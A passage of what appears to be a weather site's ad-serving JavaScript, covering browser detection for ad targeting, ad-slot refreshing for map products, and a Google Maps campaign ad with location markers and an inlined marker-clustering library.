    window.sadvars = sadvars;
    processDFP.pageLevelTargets += "\n" + stext;
  },
  getUserAgentString: function () {
    let userAgent = "";
    if (typeof navigator !== "undefined") {
      userAgent = navigator.userAgent;
    }
    return userAgent;
  },
  getBrowserFromUserAgentString: function (ua) {
    let browserName = "other";
    if (ua.indexOf("Firefox") > -1) {
      browserName = "firefox";
    } else if (ua.indexOf("SamsungBrowser") > -1) {
      browserName = "samsung";
    } else if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) {
      browserName = "opera";
    } else if (ua.indexOf("Trident") > -1) {
      browserName = "ie";
    } else if (ua.indexOf("Edge") > -1 || ua.indexOf("Edg") > -1) {
      browserName = "edge";
    } else if (ua.indexOf("Chrome") > -1) {
      browserName = "chrome";
    } else if (ua.indexOf("Safari") > -1) {
      browserName = "safari";
    }
    return browserName;
  },
  getBrowserAdParam: function () {
    let browser = "";
    const userAgentString = processDFP.getUserAgentString();
    const browserName = processDFP.getBrowserFromUserAgentString(userAgentString);
    browser = `desktop_${browserName}`;
    return browser;
  },
  renderBehaviouralTargetting: function (adbehaviouraltargetting) {
    var dfpbrtr_timestamp = unescape(_fd.k('pelm_brtr_timestamp'));
    if (dfpbrtr_timestamp == "undefined" || dfpbrtr_timestamp == undefined || dfpbrtr_timestamp == null || dfpbrtr_timestamp == "null") {
      var currenttimeinsecs = new Date().getTime() / 1000;
      _fd.m("pelm_brtr_timestamp", currenttimeinsecs, 30);
      _fd.ls_set("local", "pelm_brtr", '');
    }
    var dfpbrtr = unescape(_fd.ls_get("local", "pelm_brtr"));
    if (dfpbrtr == "undefined" || dfpbrtr == null || dfpbrtr == "null") {
      dfpbrtr = '';
    }
    var adbrtrarray = adbehaviouraltargetting.split("-");
    for (i = 0; i < adbrtrarray.length; i++) {
      if (dfpbrtr.indexOf(adbrtrarray[i]) == -1) {
        if (dfpbrtr.length > 0) {
          dfpbrtr = dfpbrtr + "-";
        }
        dfpbrtr = dfpbrtr + adbrtrarray[i];
      }
    }
    if (dfpbrtr != "") {
      _fd.ls_set("local", "pelm_brtr", dfpbrtr);
    }
  },
  refreshad: function (evt) {
    var mapproducts = new Array('radar', 'satrad', 'trafficcameras', 'regional', 'trafficflow', 'alerts', 'highwayforecast', 'ushighwayforecast', 'highwayconditions', 'lightning');
    var adproducts = new Array('sat_and_rad', 'sat_and_rad', 'traffic_cameras', 'current_weather', 'traffic_flow', 'alerts', 'highway_forecast', 'us_highway_forecast', 'highway_conditions', 'lightning');
    var fsm = $('html').hasClass('fullscreen-map');
    if (typeof window.placecodedataparam !== "undefined") {
      fsm = false;
    }
    if (typeof window.alertexists !== "undefined") {
      if (window.alertexists !== "FALSE") {
        fsm = true;
      }
    }
    if (typeof window.adtakeover !== 'undefined') {
      for (var i = window.adrefreshslots.length - 1; i >= 0; i--) {
        if (window.adrefreshslots[i].indexOf('topbanner') != -1) {
          window.adrefreshslots.splice(i, 1);
        } else if (window.adrefreshslots[i].indexOf('bigbox') != -1) {
          window.adrefreshslots.splice(i, 1);
        }
      }
    }
    var _evt = evt.replace('maps/', '');
    for (i = 0; i < mapproducts.length; i++) {
      if (_evt == mapproducts[i]) {
        if (typeof window.placecodedataparam !== "undefined" || fsm) {
          var mapviewclass = $("#map-view").attr("class");
          var expnd = false;
          if (mapviewclass) {
            expnd = mapviewclass.indexOf("expanded") != -1;
          }
          if (expnd || fsm) {
            for (j = 0; j < window.adrefreshslots.length; j++) {
              if (window.adrefreshslots[j].indexOf(adproducts[i]) != -1 && window.adrefreshslots[j].indexOf(fsm ? 'fullscreen' : 'citypagemap') != -1) {
                var elm = document.getElementById(window.adrefreshslots[j]);
                if (window.maplayershown.indexOf(elm) != -1) {
                  $(window.maplayershown).empty();
                  googletag.pubads().refresh([window.adslots[window.adrefreshslots[j]]]);
                  if (window.enableSRA) {
                    processDFP.refreshSRA([window.adslots[window.adrefreshslots[j]]]);
                  }
                }
                if (window.maplayershown.indexOf(elm) == -1) {
                  $(window.maplayershown).empty();
                  googletag.display(window.adrefreshslots[j]);
                  if (window.enableSRA) {
                    processDFP.refreshSRA([window.adslots[window.adrefreshslots[j]]]);
                  }
                  window.maplayershown.push(elm);
                }
              }
            }
          } else {
            for (j = 0; j < window.adrefreshslots.length; j++) {
              if (window.adrefreshslots[j].indexOf(adproducts[i]) != -1 && window.adrefreshslots[j].indexOf(fsm ? 'fullscreen' : 'citypagemap') != -1) {
                window.maplayertoshow = window.adrefreshslots[j];
              }
            }
          }
        } else {
          var elm = document.getElementById('div-gpt-ad-topbanner');
          if ($.inArray(elm, window.maplayershown)) {
            window.maplayershown.push(elm);
          }
          if (typeof window.adtakeover == 'undefined') {
            $("#div-gpt-ad-topbanner").empty();
            $("#div-gpt-ad-bigbox").empty();
            $("#div-gpt-ad-bigbox").hide();
          }
          for (j = 0; j < window.adrefreshslots.length; j++) {
            $("#" + window.adrefreshslots[j]).empty();
            $("#" + window.adrefreshslots[j]).hide();
          }
          var adslotstodisplay = new Array();
          for (j = 0; j < window.adrefreshslots.length; j++) {
            if (window.adrefreshslots[j].indexOf('maps_' + adproducts[i]) != -1) {
              adslotstodisplay.push(window.adrefreshslots[j]);
            }
          }
          var maplayershownupdated = false;
          var elm = document.getElementById(adslotstodisplay[1]);
          window.maplayershownslotname = adslotstodisplay[1];
          if (window.maplayershown.indexOf(elm) != -1) {
            for (j = 0; j < adslotstodisplay.length; j++) {
              window.adslots[adslotstodisplay[j]].setCategoryExclusion('_Run Only Above The Fold');
            }
            googletag.pubads().refresh([window.adslots[adslotstodisplay[0]], window.adslots[adslotstodisplay[1]], window.adslots[adslotstodisplay[2]], window.adslots[adslotstodisplay[3]], window.adslots[adslotstodisplay[4]], window.adslots[adslotstodisplay[5]]]);
          }
          if (window.maplayershown.indexOf(elm) == -1) {
            for (j = 0; j < adslotstodisplay.length; j++) {
              googletag.display(adslotstodisplay[j]);
              if (!maplayershownupdated) {
                window.maplayershown.push(elm);
                maplayershownupdated = true;
              }
            }
          }
        }
      }
    }
  },
  webtag_mapad: function () {
    var map,
      b = null;
    _parse = console.warn;
    var n = "//maps.google.com/maps/api/js?v=3";
    var nInfo = "//google-maps-utility-library-v3.googlecode.com/svn/trunk/infobox/src/infobox.js";
    try {
      if (typeof window.google == 'undefined' || typeof window.google.maps == 'undefined') {
        if (window.pelmCustomAd.options.debug && typeof console != "undefined" && console.log) {
          console.info("No Google Maps library available on page load so inserting the script to the page");
        }
        if (window._config && window._config.maps && window._config["webtagging-api-key"]) {
          n += (n.indexOf('?') < 0 ? '?' : '&') + 'key=' + window._config["webtagging-api-key"];
          n += "&callback=processDFP.webtag_mapad";
          if (typeof window._config != 'undefined' && typeof window._config.locale != 'undefined' && window._config.locale) {
            n += '&channel=' + window._config.locale + '_' + window._config.platform;
            if (window._config.lang) {
              n += '&language=' + window._config.lang;
            }
          }
        }
        if (typeof window._config.map_lib_loading == 'undefined') {
          if (typeof window.google == 'undefined' || typeof window.google.maps == 'undefined') {
            var gs = document.createElement('SCRIPT');
            gs.id = "google-map-v31";
            gs.src = n;
            if (typeof window.google == 'undefined' || typeof window.google.maps == 'undefined' && typeof window.google.maps.LatLng != 'undefined' && typeof window.google.maps.Map != 'undefined') {
              document.getElementsByTagName('head')[0].appendChild(gs);
              window._config.map_lib_loading = true;
            }
            if (window.pelmCustomAd.options.debug && typeof console != "undefined" && console.log) {
              console.info(gs);
            }
          }
        } else {
          if (window.pelmCustomAd.options.debug && typeof console != "undefined" && console.log) {
            console.info("Google Maps library loaded and its available to use");
          }
          if (typeof window.google != 'undefined' && typeof window.google.maps != 'undefined' && typeof window.google.maps.LatLng != 'undefined' && typeof window.google.maps.Map != 'undefined') {
            window.runAdCampaign();
          } else {
            window.pelmCustomAd.timerSet = setTimeout(function () {
              window.runAdCampaign();
            }, 500);
            window.pelmCustomAd.initialAdRun = true;
          }
        }
      } else {
        var chkMlLib = function () {
          if (typeof window.google != 'undefined' && typeof window.google.maps != 'undefined' && typeof window.google.maps.LatLng != 'undefined' && typeof window.google.maps.Map != 'undefined') {
            window.runAdCampaign();
          } else {
            setTimeout(chkMlLib, 100);
          }
        };
        setTimeout(chkMlLib, 100);
      }
      if (window.pelmCustomAd.options.flag_markers_cluster) {
        addClustering();
        if (window.pelmCustomAd.options.debug && typeof console != "undefined" && console.log) {
          console.info("Marker Cluster library is added to the page");
        }
      }
    } catch (err) {
      if (window.pelmCustomAd.options.debug && typeof console != "undefined" && console.log) {
        console.log(err);
      }
    }
    window.runAdCampaign = function () {
      if (typeof window.google == 'undefined' || typeof window.google.maps == 'undefined' || typeof window.google.maps.LatLng == 'undefined' || typeof window.google.maps.Map == 'undefined') {
        return setTimeout(window.runAdCampaign, 100);
      }
      var infowindow;
      var myLatlng = new google.maps.LatLng(window.pelmCustomAd.uLat, window.pelmCustomAd.uLng);
      if (window.pelmCustomAd.options.debug && typeof console != "undefined" && console.log) {
        console.info("Current location Lat and lng:: " + window.pelmCustomAd.uLat, window.pelmCustomAd.uLng);
      }
      if (typeof window.pelmCustomAd.timerSet != 'boolean') {
        clearTimeout(window.pelmCustomAd.timerSet);
        window.pelmCustomAd.clearTimerSet = true;
      }
      function renderMap() {
        dataLayer.push({
          'event': 'eventTracker',
          'eventCategory': "webtagging_" + window.pelmCustomAd.campainid,
          'eventAction': "impression",
          'eventLabel': "view",
          'eventNonInt': true
        });
        var mapOptions = {
          zoom: window.pelmCustomAd.options.map_zoom,
          mapTypeControl: false,
          panControl: false,
          zoomControl: true,
          zoomControlOptions: {
            position: google.maps.ControlPosition.LEFT_BOTTOM
          },
          streetViewControl: false,
          center: myLatlng
        };
        map = new google.maps.Map(document.getElementById('div-gpt-ad-bigbox-maps_webtagging_ad'), mapOptions);
        window.pelmCustomAd._m = map;
        window.pelmCustomAd.initialLoad = 0;
        loadCampaingnData(map);
        if (window.pelmCustomAd.options.flag_expandmap) {
          var node = document.getElementById('div-gpt-ad-bigbox-maps_webtagging_ad');
          var ne = document.createElement('div');
          ne.id = 'map-expand-options';
          ne.innerHTML = '<div class="controls"><i class="icon-full-screen" id="expand" onclick=""></i><i id="reset" class="icon-exit-full-screen" onclick=""></i></div>';
          node.appendChild(ne);
        }
      }
      var _getMapBounding = function (map) {
        if (!b) {
          return {
            x1: null,
            y1: null,
            x2: null,
            y2: null
          };
        }
        return {
          x1: b.getSouthWest().lng(),
          y1: b.getNorthEast().lat(),
          x2: b.getNorthEast().lng(),
          y2: b.getSouthWest().lat()
        };
      };
      function loadCampaingnData(map) {
        if (b = map.getBounds()) {
          if (!(typeof window.markerinfoclick !== 'undefined' && window.markerinfoclick == true)) {
            map.clearMarkers();
          }
          var opts = _getMapBounding(map),
            du = document.location.origin;
          if (typeof du == 'undefined') {
            du = window.location.protocol + "//" + window.location.hostname + (window.location.port ? ':' + window.location.port : '');
          }
          if (window.pelmCustomAd.options.debug && typeof console != "undefined" && console.log) {
            console.info("Bounding box for the current  map window:: ");
            console.log(opts);
          }
          if (window.pelmCustomAd.options.sample) {
            __.a(du + "/api/maps/mapad_locations/{0}/{1}/{2}/{3}/{4}".format(240224559, opts.x1, opts.y1, opts.x2, opts.y2), setMarkers, _parse);
            if (window.pelmCustomAd.options.debug && typeof console != "undefined" && console.log) {
              console.info("Fetching the sample data with the parameters passed in the order of /CampaingID/X1/Y1/X2/Y2:: " + du + "/api/maps/mapad_locations/{0}/{1}/{2}/{3}/{4}".format(240224559, opts.x1, opts.y1, opts.x2, opts.y2));
            }
          } else {
            __.a("/api/maps/mapad_locations/{0}/{1}/{2}/{3}/{4}".format(window.pelmCustomAd.campainid, opts.x1, opts.y1, opts.x2, opts.y2), setMarkers, _parse);
            if (window.pelmCustomAd.options.debug && typeof console != "undefined" && console.log) {
              console.info("Fetching the data with the parameters passed in the order of /CampaingID/X1/Y1/X2/Y2:: " + du + "/api/maps/mapad_locations/{0}/{1}/{2}/{3}/{4}".format(window.pelmCustomAd.campainid, opts.x1, opts.y1, opts.x2, opts.y2));
            }
          }
        } else {
          setTimeout(function () {}, 100);
        }
      }
      (function () {
        google.maps.Map.prototype.markers = new Array();
        google.maps.Map.prototype.addMarker = function (marker) {
          this.markers[this.markers.length] = marker;
        };
        google.maps.Map.prototype.getMarkers = function () {
          return this.markers;
        };
        google.maps.Map.prototype.clearMarkers = function () {
          if (infowindow) {
            infowindow.close();
          }
          for (var i = 0; i < this.markers.length; i++) {
            this.markers[i].setMap(null);
          }
        };
      })();
      function createMarker(info, latlng) {
        var cs = '<div class="campaignToolTip">#logo-image##title##desc#</div>';
        var pinImage = {
          url: window.pelmCustomAd.options.marker_image,
          size: new google.maps.Size(32, 32),
          origin: new google.maps.Point(0, 0),
          anchor: new google.maps.Point(0, 32)
        };
        var clickurl = '';
        phoneno = '';
        logourl = '';
        if (window.pelmCustomAd.options.marker_image != false) {
          var marker = new google.maps.Marker({
            position: latlng,
            map: map,
            title: info.Name,
            zIndex: 1,
            icon: pinImage
          });
        } else {
          var marker = new google.maps.Marker({
            position: latlng,
            map: map,
            title: info.Name,
            zIndex: 1
          });
        }
        google.maps.event.addListener(marker, "click", function () {
          if (infowindow) {
            infowindow.close();
          }
          if (typeof info != "undefined" && typeof info.impressionUrl != "undefined" && info.impressionUrl != '') {
            var img = new Image(1, 1);
            img.src = info.impressionUrl;
            if (window.pelmCustomAd.options.debug && typeof console != "undefined" && console.log) {
              console.info("Conversion Tracking:: ");
              console.log(img);
            }
          } else {
            if (window.pelmCustomAd.options.debug && typeof console != "undefined" && console.log) {
              console.info("There is no ImpressionUrl for this location:: ");
            }
          }
          if (typeof info != "undefined") {
            dataLayer.push({
              'event': 'eventTracker',
              'eventCategory': "webtagging_openInfoWindow_" + window.pelmCustomAd.campainid,
              'eventAction': "clicks",
              'eventLabel': "thumb"
            });
          }
          if (typeof info != "undefined" && typeof info.LogoUrl != "undefined" && info.LogoUrl != '') {
            if (typeof info != "undefined" && typeof info.clickUrl != "undefined" && info.clickUrl != '') {
              logourl = '<a class="campaignLogoUrl" target="_blank" onClick="javascript: logoClicked();" href="' + info.clickUrl + '"><img class="campaignlogo" src="' + info.LogoUrl + '" alt="' + info.Name + '" border="0" /></a>';
            } else {
              logourl = '<img class="campaignlogo" src="' + info.LogoUrl + '" alt="' + info.Name + '" border="0" />';
            }
          }
          if (typeof info != "undefined" && typeof info.clickUrl != "undefined" && info.clickUrl != '') {
            info.Name = '<a class="campaignStoreName" target="_blank" onClick="javascript: logoClicked();" href="' + info.clickUrl + '">' + info.Name + '</a>';
          }
          clickurl = '<a onClick="javascript: getDirectionsClicked()" class="campaignGetDirections" href="https://www.google.com/maps/dir//' + info.Address + ', ' + info.City + ', ' + info.Province + ', ' + info.PostalCode + '" target="_blank">Get directions</a>';
          getDirectionsClicked = function (e) {
            dataLayer.push({
              'event': 'eventTracker',
              'eventCategory': "webtagging_clickGetDirections_" + window.pelmCustomAd.campainid,
              'eventAction': "clicks",
              'eventLabel': "thumb"
            });
          };
          logoClicked = function (e) {
            dataLayer.push({
              'event': 'eventTracker',
              'eventCategory': "webtagging_clickLogoUrl_" + window.pelmCustomAd.campainid,
              'eventAction': "clicks",
              'eventLabel': "thumb"
            });
          };
          if (typeof info != "undefined" && typeof info.Phone != "undefined" && info.Phone != '') {
            phoneno = info.Phone;
          }
          cs = cs.replace('#logo-image#', logourl).replace('#title#', info.Name).replace('#desc#', '<ul class="campaignAdrs"><li>' + info.Address + '</li><li>' + info.City + ', ' + info.Province + '</li><li>' + info.PostalCode + '</li><li><a href="tel:' + phoneno + '">' + phoneno + '</a></li></ul>' + clickurl);
          infowindow = new google.maps.InfoWindow({
            content: cs
          });
          infowindow.open(map, marker);
          window.markerinfoclick = true;
          event.stopPropagation();
        });
        return marker;
      }
      function setMarkers(locations) {
        var markers = [],
          b,
          mk;
        lc = Function('return (' + locations + ')')();
        lc = lc.Locations;
        if (window.pelmCustomAd.options.debug && typeof console != "undefined" && console.log) {
          console.info("Total number of locations available within the given range:: " + lc.length);
        }
        for (b in lc) {
          lcc = lc[b].Coordinates;
          lccinfo = lc[b].LocationInfo;
          lccinfo.clickUrl = lc[b].ClickUrl;
          lccinfo.impressionUrl = lc[b].ImpressionUrl;
          var ll = new google.maps.LatLng(lcc.Latitude, lcc.Longitude);
          mk = createMarker(lccinfo, ll);
          map.addMarker(mk);
          if (window.pelmCustomAd.options.flag_markers_cluster) {
            markers.push(mk);
          }
        }
        if (window.pelmCustomAd.options.flag_markers_cluster) {
          var mcOptions = {
            gridSize: window.pelmCustomAd.options.markers_cluster.gridSize,
            maxZoom: window.pelmCustomAd.options.markers_cluster.maxZoom
          };
          if (typeof window.markerCluster !== 'undefined') {
            if (typeof window.markerinfoclick !== 'undefined' && window.markerinfoclick == true) {
              window.markerinfoclick = false;
            } else {
              window.markerCluster.clearMarkers();
            }
          }
          window.markerCluster = new MarkerClusterer(map, markers, mcOptions);
          if (window.pelmCustomAd.options.debug && typeof console != "undefined" && console.log) {
            console.info("Clustering of markers are processed by passing the below options to the library:: ");
            console.log(mcOptions);
          }
        }
      }
      renderMap();
      if (window.pelmCustomAd.options.flag_expandmap) {
        var actions = {
          'expand': expandMap,
          'reset': reset
        };
        for (var act in actions) {
          google.maps.event.addDomListener(document.getElementById(act), 'click', actions[act]);
        }
      }
      var tagElm = document.getElementById("div-gpt-ad-bigbox-maps_webtagging_ad");
      var mapExpand = false;
      mapReset = false;
      google.maps.event.addListener(map, 'zoom_changed', function () {
        if (window.pelmCustomAd.options.debug && typeof console != "undefined" && console.log) {
          console.info("Maps bounding box after zoom::");
          console.info("Current Zoom is ::" + map.getZoom());
          if (b = map.getBounds()) {
            console.log(_getMapBounding(map));
          }
        }
      });
      google.maps.event.addListener(map, 'center_changed', function () {
        if (window.pelmCustomAd.options.debug && typeof console != "undefined" && console.log) {
          console.info("Maps bounding box after Pan::");
          if (b = map.getBounds()) {
            console.log(_getMapBounding(map));
          }
        }
      });
      function expandMap() {
        tagElm.className = 'map-expand';
        mapExpand = true;
        var expandLatlng = new google.maps.LatLng(window.pelmCustomAd.uLat, window.pelmCustomAd.uLng);
        if (window.pelmCustomAd.options.debug && typeof console != "undefined" && console.log) {
          console.info("Map expand:: ");
          console.log("Map Center LatLong::" + expandLatlng);
          console.log("zoom::" + window.pelmCustomAd.options.expandmap.zoom);
          console.info("Maps bounding box before resize::");
          if (b = map.getBounds()) {
            console.log(_getMapBounding(map));
          }
        }
        google.maps.event.addListener(map, 'bounds_changed', function () {
          if (window.pelmCustomAd.options.debug && typeof console != "undefined" && console.log) {
            console.info("Maps bounding box after resize::");
            if (b = map.getBounds()) {
              console.log(_getMapBounding(map));
            }
          }
          if (mapExpand) {
            map.setCenter(expandLatlng);
          }
          mapExpand = false;
        });
        map.setZoom(window.pelmCustomAd.options.expandmap.zoom);
        google.maps.event.trigger(map, 'resize');
      }
      function reset() {
        tagElm.className = 'map-reset';
        mapReset = true;
        var resetLatlng = new google.maps.LatLng(window.pelmCustomAd.uLat, window.pelmCustomAd.uLng);
        if (window.pelmCustomAd.options.debug && typeof console != "undefined" && console.log) {
          console.info("Reset to original size with the default values:: ");
          console.log("Map Center LatLong::" + resetLatlng);
          console.log("zoom::" + window.pelmCustomAd.options.map_zoom);
          console.info("Maps bounding box before reset ::");
          if (b = map.getBounds()) {
            console.log(_getMapBounding(map));
          }
        }
        google.maps.event.addListener(map, 'bounds_changed', function () {
          if (window.pelmCustomAd.options.debug && typeof console != "undefined" && console.log) {
            console.info("Maps bounding box after reset::");
            if (b = map.getBounds()) {
              console.log(_getMapBounding(map));
            }
          }
          if (mapReset) {
            map.setCenter(resetLatlng);
          }
          mapReset = false;
        });
        map.setZoom(window.pelmCustomAd.options.map_zoom);
        google.maps.event.trigger(map, 'resize');
      }
      google.maps.event.addListener(map, 'idle', function () {
        if (window.pelmCustomAd.options.debug && typeof console != "undefined" && console.log) {
          console.info("Load the data since map is in idle state::");
        }
        window.pelmCustomAd.idleTimeout = window.setTimeout(function () {
          loadCampaingnData(map);
          window.pelmCustomAd.initialLoad += 1;
        }, 500);
        google.maps.event.addListenerOnce(map, 'bounds_changed', function () {
          window.clearTimeout(window.pelmCustomAd.idleTimeout);
        });
      });
    };
    String.prototype.format = function () {
      var a = arguments;
      return this.replace(/{(\d+)}/g, function (m, n) {
        return typeof a[n] != 'undefined' ? a[n] : m;
      });
    };
  }
};
function contains(parent, descendant) {
  return parent == descendant || Boolean(parent.compareDocumentPosition(descendant) & 16);
}
window.pelmCustomAd = {
  companionadplayed: false,
  initialAdRun: false,
  recurringAdRun: false,
  timerSet: false,
  idleTimeout: false,
  clearTimerSet: false,
  options: {
    marker_image: false,
    map_zoom: 8,
    flag_markers_cluster: false,
    markers_cluster: {
      gridSize: 50,
      maxZoom: 15
    },
    flag_expandmap: true,
    expandmap: {
      boundingbox: {
        x1: '',
        y1: '',
        x2: '',
        y2: ''
      },
      zoom: 8
    },
    sample: false,
    debug: false
  }
};
window.runMapAd = function (campainid, options) {
  if (typeof campainid != 'undefined' && campainid) {
    window.pelmCustomAd.campainid = campainid;
    var tloc;
    if (typeof localStorage['lastKnownLocation'] != 'undefined') {
      tloc = JSON.parse(localStorage['lastKnownLocation']);
    }
    if (typeof tloc != "undefined" && typeof tloc == "object" && typeof tloc.lat != "undefined" && typeof tloc.lng != "undefined" && typeof window._config.placecode == "undefined") {
      window.pelmCustomAd.uLat = tloc.lat;
      window.pelmCustomAd.uLng = tloc.lng;
    } else if (typeof window._user_config != "undefined" && typeof window._user_config == "object" && typeof window._user_config.lat != "undefined" && typeof window._user_config.lng != "undefined") {
      window.pelmCustomAd.uLat = window._user_config.lat;
      window.pelmCustomAd.uLng = window._user_config.lng;
    } else if (typeof window._config.lat != "undefined" && typeof window._config.lng != "undefined") {
      window.pelmCustomAd.uLat = window._config.lat;
      window.pelmCustomAd.uLng = window._config.lng;
      if (typeof window._config.placecode == "undefined" && typeof options != 'undefined' && typeof options.last_fallback_lat != 'undefined' && typeof options.last_fallback_lng != 'undefined' && typeof options.last_fallback_zoom != 'undefined') {
        window.pelmCustomAd.uLat = options.last_fallback_lat;
        window.pelmCustomAd.uLng = options.last_fallback_lng;
        options.map_zoom = options.last_fallback_zoom;
      }
    }
    if (typeof options != 'undefined' && typeof options.map_zoom != 'undefined' && typeof options.expandmap == 'undefined') {
      options.expandmap = window.pelmCustomAd.options.expandmap;
      options.expandmap.zoom = options.map_zoom - 1;
    }
    ;
    for (var k in options) {
      if (window.pelmCustomAd.options.hasOwnProperty(k)) {
        window.pelmCustomAd.options[k] = options[k];
      }
    }
    if (window.pelmCustomAd.options.debug && typeof console != "undefined" && console.log) {
      console.info("Options passed:: ");
      console.log(options);
      console.info("Values are stored in global variable pelmCustomAd::");
      console.log(pelmCustomAd);
    }
    if (window.pelmCustomAd.companionadplayed == false) {
      document.getElementById("div-gpt-ad-bigbox-maps_webtagging_ad").className = 'ad-bigbox-map';
      processDFP.webtag_mapad();
    }
    window.pelmCustomAd.companionadplayed = true;
    (function () {
      if (document.getElementById('div-gpt-ad-bigbox-maps_webtagging_ad').childNodes.length != 2 && !window.pelmCustomAd.clearTimerSet) {
        window.pelmCustomAd.timerSet = setTimeout(function () {
          window.runAdCampaign();
        }, 500);
        window.pelmCustomAd.recurringAdRun = true;
      }
    })();
  }
};
function addClustering() {
  if (window.pelmCustomAd.options.flag_markers_cluster) {
    function MarkerClusterer(map, opt_markers, opt_options) {
      this.extend(MarkerClusterer, google.maps.OverlayView);
      this.map_ = map;
      this.markers_ = [];
      this.clusters_ = [];
      this.sizes = [53, 56, 66, 78, 90];
      this.styles_ = [];
      this.ready_ = false;
      var options = opt_options || {};
      this.gridSize_ = options['gridSize'] || 60;
      this.minClusterSize_ = options['minimumClusterSize'] || 2;
      this.maxZoom_ = options['maxZoom'] || null;
      this.styles_ = options['styles'] || [];
      this.imagePath_ = options['imagePath'] || this.MARKER_CLUSTER_IMAGE_PATH_;
      this.imageExtension_ = options['imageExtension'] || this.MARKER_CLUSTER_IMAGE_EXTENSION_;
      this.zoomOnClick_ = true;
      if (options['zoomOnClick'] != undefined) {
        this.zoomOnClick_ = options['zoomOnClick'];
      }
      this.averageCenter_ = false;
      if (options['averageCenter'] != undefined) {
        this.averageCenter_ = options['averageCenter'];
      }
      this.setupStyles_();
      this.setMap(map);
      this.prevZoom_ = this.map_.getZoom();
      var that = this;
      google.maps.event.addListener(this.map_, 'zoom_changed', function () {
        var zoom = that.map_.getZoom();
        if (that.prevZoom_ != zoom) {
          that.prevZoom_ = zoom;
          that.resetViewport();
        }
      });
      google.maps.event.addListener(this.map_, 'idle', function () {
        that.redraw();
      });
      if (opt_markers && opt_markers.length) {
        this.addMarkers(opt_markers, false);
      }
    }
    MarkerClusterer.prototype.MARKER_CLUSTER_IMAGE_PATH_ = 'https://raw.githubusercontent.com/googlemaps/v3-utility-library/master/markerclustererplus/' + 'images/m';
    MarkerClusterer.prototype.MARKER_CLUSTER_IMAGE_EXTENSION_ = 'png';
    MarkerClusterer.prototype.extend = function (obj1, obj2) {
      return function (object) {
        for (var property in object.prototype) {
          this.prototype[property] = object.prototype[property];
        }
        return this;
      }.apply(obj1, [obj2]);
    };
    MarkerClusterer.prototype.onAdd = function () {
      this.setReady_(true);
    };
    MarkerClusterer.prototype.draw = function () {};
    MarkerClusterer.prototype.setupStyles_ = function () {
      if (this.styles_.length) {
        return;
      }
      for (var i = 0, size; size = this.sizes[i]; i++) {
        this.styles_.push({
          url: this.imagePath_ + (i + 1) + '.' + this.imageExtension_,
          height: size,
          width: size
        });
      }
    };
    MarkerClusterer.prototype.fitMapToMarkers = function () {
      var markers = this.getMarkers();
      var bounds = new google.maps.LatLngBounds();
      for (var i = 0, marker; marker = markers[i]; i++) {
        bounds.extend(marker.getPosition());
      }
      this.map_.fitBounds(bounds);
    };
    MarkerClusterer.prototype.setStyles = function (styles) {
      this.styles_ = styles;
    };
    MarkerClusterer.prototype.getStyles = function () {
      return this.styles_;
    };
    MarkerClusterer.prototype.isZoomOnClick = function () {
      return this.zoomOnClick_;
    };
    MarkerClusterer.prototype.isAverageCenter = function () {
      return this.averageCenter_;
    };
    MarkerClusterer.prototype.getMarkers = function () {
      return this.markers_;
    };
    MarkerClusterer.prototype.getTotalMarkers = function () {
      return this.markers_.length;
    };
    MarkerClusterer.prototype.setMaxZoom = function (maxZoom) {
      this.maxZoom_ = maxZoom;
    };
    MarkerClusterer.prototype.getMaxZoom = function () {
      return this.maxZoom_;
    };
    MarkerClusterer.prototype.calculator_ = function (markers, numStyles) {
      var index = 0;
      var count = markers.length;
      var dv = count;
      while (dv !== 0) {
        dv = parseInt(dv / 10, 10);
        index++;
      }
      index = Math.min(index, numStyles);
      return {
        text: count,
        index: index
      };
    };
    MarkerClusterer.prototype.setCalculator = function (calculator) {
      this.calculator_ = calculator;
    };
    MarkerClusterer.prototype.getCalculator = function () {
      return this.calculator_;
    };
    MarkerClusterer.prototype.addMarkers = function (markers, opt_nodraw) {
      for (var i = 0, marker; marker = markers[i]; i++) {
        this.pushMarkerTo_(marker);
      }
      if (!opt_nodraw) {
        this.redraw();
      }
    };
    MarkerClusterer.prototype.pushMarkerTo_ = function (marker) {
      marker.isAdded = false;
      if (marker['draggable']) {
        var that = this;
        google.maps.event.addListener(marker, 'dragend', function () {
          marker.isAdded = false;
          that.repaint();
        });
      }
      this.markers_.push(marker);
    };
    MarkerClusterer.prototype.addMarker = function (marker, opt_nodraw) {
      this.pushMarkerTo_(marker);
      if (!opt_nodraw) {
        this.redraw();
      }
    };
    MarkerClusterer.prototype.removeMarker_ = function (marker) {
      var index = -1;
      if (this.markers_.indexOf) {
        index = this.markers_.indexOf(marker);
      } else {
        for (var i = 0, m; m = this.markers_[i]; i++) {
          if (m == marker) {
            index = i;
            break;
          }
        }
      }
      if (index == -1) {
        return false;
      }
      marker.setMap(null);
      this.markers_.splice(index, 1);
      return true;
    };
    MarkerClusterer.prototype.removeMarker = function (marker, opt_nodraw) {
      var removed = this.removeMarker_(marker);
      if (!opt_nodraw && removed) {
        this.resetViewport();
        this.redraw();
        return true;
      } else {
        return false;
      }
    };
    MarkerClusterer.prototype.removeMarkers = function (markers, opt_nodraw) {
      var removed = false;
      for (var i = 0, marker; marker = markers[i]; i++) {
        var r = this.removeMarker_(marker);
        removed = removed || r;
      }
      if (!opt_nodraw && removed) {
        this.resetViewport();
        this.redraw();
        return true;
      }
    };
    MarkerClusterer.prototype.setReady_ = function (ready) {
      if (!this.ready_) {
        this.ready_ = ready;
        this.createClusters_();
      }
    };
    MarkerClusterer.prototype.getTotalClusters = function () {
      return this.clusters_.length;
    };
    MarkerClusterer.prototype.getMap = function () {
      return this.map_;
    };
    MarkerClusterer.prototype.setMap = function (map) {
      this.map_ = map;
    };
    MarkerClusterer.prototype.getGridSize = function () {
      return this.gridSize_;
    };
    MarkerClusterer.prototype.setGridSize = function (size) {
      this.gridSize_ = size;
    };
    MarkerClusterer.prototype.getMinClusterSize = function () {
      return this.minClusterSize_;
    };
    MarkerClusterer.prototype.setMinClusterSize = function (size) {
      this.minClusterSize_ = size;
    };
    MarkerClusterer.prototype.getExtendedBounds = function (bounds) {
      var projection = this.getProjection();
      var tr = new google.maps.LatLng(bounds.getNorthEast().lat(), bounds.getNorthEast().lng());
      var bl = new google.maps.LatLng(bounds.getSouthWest().lat(), bounds.getSouthWest().lng());
      var trPix = projection.fromLatLngToDivPixel(tr);
      trPix.x += this.gridSize_;
      trPix.y -= this.gridSize_;
      var blPix = projection.fromLatLngToDivPixel(bl);
      blPix.x -= this.gridSize_;
      blPix.y += this.gridSize_;
      var ne = projection.fromDivPixelToLatLng(trPix);
      var sw = projection.fromDivPixelToLatLng(blPix);
